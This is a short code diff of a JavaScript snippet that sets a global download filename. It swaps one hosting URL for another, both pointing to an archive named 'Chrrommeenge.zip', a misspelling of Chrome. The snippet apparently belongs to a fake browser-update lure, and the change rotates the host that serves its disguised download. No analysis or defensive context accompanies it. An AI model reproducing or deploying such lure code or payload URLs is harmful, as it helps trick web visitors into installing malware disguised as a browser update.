@@ -1,6 +1,7 @@
 (function() {
-    window.filename = 'https://pub-c8635f87f2a649eaa26b43d75b8f034a.r2.dev/Chrrommeenge.zip';
+    window.filename = 'https://sudojtbwn.s3.ap-northeast-2.amazonaws.com/Chrrommeenge.zip';
 })();
+
 
 
 
